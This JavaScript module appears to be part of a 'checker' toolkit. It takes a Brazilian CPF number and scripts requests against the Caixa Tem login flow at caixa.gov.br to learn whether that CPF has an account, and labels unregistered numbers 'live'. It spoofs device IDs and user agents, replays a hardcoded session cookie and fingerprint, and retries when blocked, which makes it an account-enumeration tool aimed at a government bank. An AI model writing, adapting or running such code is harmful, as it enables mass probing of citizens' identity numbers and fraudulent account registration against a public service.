const cheerio = require('cheerio');
const conf = require('../../../utils/checkers');
const RequesT = conf.req
const Agent = conf.useragent
const Sleep = conf.sleep;


function create_UUID(){
    var dt = new Date().getTime();
    var uuid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = (dt + Math.random()*16)%16 | 0;
        dt = Math.floor(dt/16);
        return (c=='x' ? r :(r&0x3|0x8)).toString(16);
    });
    return uuid;
}

async function checker(test){

    if(test != ''){
         
        test = test.replace(/['.']/g,'')
        test = test.replace('-', '')
        test = test.replace(/\r/g,'')

        if (test.length != 11) {
            return {success:false, test: {user: test}}
        }
		
	}else{
		return {success:false, test: {user: test}}
	}

    while (true) {

        try {

    
            const deviceId = create_UUID();
            const UserAgent = await Agent()
            
            const req1 = await RequesT(
                'get', 
                'https://login2.caixa.gov.br/auth/realms/internet/protocol/openid-connect/auth?redirect_uri=br.gov.caixa.tem%3A%2Foauth2Callback&client_id=cli-mob-nbm&response_type=code&login_hint=04298408612&state=eK3J5ly669UzRJknjBm-EA&scope=offline_access&code_challenge=HlmMlnmzT9UWfpm5JxHD6CYol_T2bqTYmW5DAQeq3aw&code_challenge_method=S256&deviceId='+ deviceId +'&so=Android&app=br.gov.caixa.tem%3Bvertical%3Dhttps%3A%2F%2Fmobilidade.cloud.caixa.gov.br%3Bruntime%3Dmfp&origem=mf&nivel=10', 
                {'User-Agent': UserAgent}
            );

            if(req1.success = true) {
                if (req1.response.status !== 200) {
                    console.log('req1 blocada')
                    Sleep(2)
                    continue
                }
            } else {
                continue
            } 
    
            if (req1.response.status == 200) {
    
                const $ = cheerio.load(req1.response.data);
                var sessionId = $('#sessionId');
                var secondUrl = $('form');
                sessionId = sessionId.attr('value');
                secondUrl = secondUrl.attr('action');
    
                try {

                    while(true) {
                        Sleep(0.1)
    
                        const req2 = await RequesT('post', secondUrl, {
                            'Referer': 'https://login.caixa.gov.br/auth/realms/internet/protocol/openid-connect/auth?redirect_uri=br.gov.caixa.tem%3A%2Foauth2Callback&client_id=cli-mob-nbm&response_type=code&login_hint=',
                            'User-Agent': UserAgent,
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Cookie': 'AUTH_SESSION_ID=' + sessionId + '.AZRJPCAPLLX040; KC_RESTART=eyJhbGciOiJIUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICIyOGYxZTFlZC02ZDAxLTRkMDAtYWEzMS1lM2VlY2MzY2RhYmIifQ.eyJjaWQiOiJjbGktbW9iLW5ibSIsInB0eSI6Im9wZW5pZC1jb25uZWN0IiwicnVyaSI6ImJyLmdvdi5jYWl4YS50ZW06L29hdXRoMkNhbGxiYWNrIiwiYWN0IjoiQVVUSEVOVElDQVRFIiwibm90ZXMiOnsiaXNzIjoiaHR0cHM6Ly9sb2dpbjIuY2FpeGEuZ292LmJyL2F1dGgvcmVhbG1zL2ludGVybmV0IiwicmVzcG9uc2VfdHlwZSI6ImNvZGUiLCJjb2RlX2NoYWxsZW5nZV9tZXRob2QiOiJTMjU2IiwibG9naW5faGludCI6IiIsImNsaWVudF9yZXF1ZXN0X3BhcmFtX2FwcCI6ImJyLmdvdi5jYWl4YS50ZW07dmVydGljYWw9aHR0cHM6Ly9tb2JpbGlkYWRlLmNsb3VkLmNhaXhhLmdvdi5icjtydW50aW1lPW1mcCIsInNjb3BlIjoib2ZmbGluZV9hY2Nlc3MiLCJjbGllbnRfcmVxdWVzdF9wYXJhbV9kZXZpY2VJZCI6IjkxNDY5MDhlLTI0YWEtM2JjMy1hYmFhLWY4ZDUzZTQ2ZWYyOCIsImNsaWVudF9yZXF1ZXN0X3BhcmFtX3NvIjoiQW5kcm9pZCIsImNsaWVudF9yZXF1ZXN0X3BhcmFtX25pdmVsIjoiMTIiLCJzdGF0ZSI6Ikt0bEM3WmFRWVN4MVlTQmJGRWIzWnciLCJyZWRpcmVjdF91cmkiOiJici5nb3YuY2FpeGEudGVtOi9vYXV0aDJDYWxsYmFjayIsImNsaWVudF9yZXF1ZXN0X3BhcmFtX29yaWdlbSI6Im1mIiwiY29kZV9jaGFsbGVuZ2UiOiJHaDQ2QzRkaU9DcHlFVTcxbHBGQWwyUFA4SGRDcnB1RVd2eF8xTXBja2QwIn19.izfrvHwe1YSGXFxm-lNR4XrtVRhzKz6-C-83Ldb0pKE; ROUTEID=.AZRJPCAPLLX006'
                        },
                            'f10=&fingerprint=8c1621f80e9eb066d24ebff9e9238a1c&step=1&situacaoGeolocalizacao=&latitude=&longitude=&username='+test
                        )

                        if(req2.success = true){
                            if (req1.response.status !== 200) {
                                console.log('req2 blocada')
                                Sleep(1)
                                continue
                            }
                        }
                        
                        if (req2.response.data.includes('o existe cadastro para o CPF informado.')) {
                            var _results = 'CPF SEM CADASTRO'
        
                            return {success:true, status:'live', test: {user: test}, info: _results}
        
                        } else {
                            var _results = 'CPF COM CADASTRO'

                            return {success:false, status:'die', test: {user: test}, info: _results}
                        }
                    }
                } catch (err) {
                    
                }
    
            } else {
                return {success:false, status:'error', test: {user: test}}
            }
        } catch(err) {

        }
    }
}

module.exports = checker;